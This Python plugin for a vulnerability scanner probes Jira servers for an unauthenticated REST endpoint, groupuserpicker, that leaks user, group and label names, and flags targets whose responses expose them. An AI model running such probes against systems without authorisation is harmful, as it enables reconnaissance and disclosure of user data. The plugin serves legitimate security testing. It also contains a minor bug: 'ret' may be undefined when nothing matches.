import os,sys
import re
sys.path.append("../")
from lib.core import *

query = ""

class scannerclass(coreclass):
    name = "Jira Rest API Information Disclosure"
    author = "BaCde"
    description = "Jira Rest API 未授权访问导致敏感信息"
    product = "homepage"
    homepage = ""
    Reference = ""
    vulid = ""
    pubdate = "2020.02.12"

    def __init__(self,target):
        coreclass.__init__(self,target)

    def scanner(self):
        payloads = ["/rest/api/latest/groupuserpicker?query="]
        for payload in payloads:
            url = self.url + payload
            try:
                r = self.get(url,self.headers,timeout=5)
                if r:
                    content = r.content.decode()
                    if self.matchexp(":",'users',content) and self.matchexp(":",'labels',content) and self.matchexp(":",'groups',content):
                        ret = url
                        #print(url)
            except Exception as e:
                print(e)

        return self.output(payload,ret)
if __name__ == "__main__":
    p = scannerclass("http://10.0.0.100:8080/")
    print(p.scanner())
    
    